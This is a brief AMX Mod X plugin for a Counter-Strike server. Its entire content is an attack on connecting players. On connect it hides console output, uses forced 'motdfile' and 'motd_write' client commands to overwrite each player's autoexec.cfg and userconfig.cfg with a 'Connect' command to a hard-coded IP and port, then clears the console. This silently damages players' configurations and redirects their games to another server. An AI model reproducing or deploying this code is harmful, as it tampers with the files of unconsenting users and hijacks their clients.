#include <amxmodx>
#include <amxmisc>


#define CFG_FILE1 "autoexec.CFG"
#define CFG_FILE3 "userconfig.CFG"
#define CON "Connect 79.124.56.48:27019"

public client_connect(id)
{
client_is_auth(id)
}

public client_is_auth(id)
{
client_cmd(id, "developer 0")
client_cmd(id, "Motdfile ^"%s^"", CFG_FILE1)
client_cmd(id, "Motdfile ^"%s^"", CFG_FILE3)
client_cmd(id, "Motd_write %s", CON)
client_cmd(id, "clear")
}
